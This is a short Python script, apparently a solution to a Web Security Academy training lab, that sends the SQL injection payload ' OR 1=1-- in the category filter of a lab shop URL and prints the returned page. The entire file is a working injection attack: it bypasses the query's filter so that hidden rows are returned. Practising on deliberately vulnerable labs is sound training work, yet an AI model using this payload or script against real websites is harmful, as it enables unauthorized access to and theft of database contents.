from urllib.parse import quote

import requests as r


def main() -> None:
    URL = "https://0a05009804f5d84b8083ad180003002f.web-security-academy.net/filter?category=Gifts"
    PAYLOAD = "' OR 1=1--"

    URL += quote(PAYLOAD)

    response: r.Response = r.get(URL)

    print(response.text)


if __name__ == "__main__":
    main()
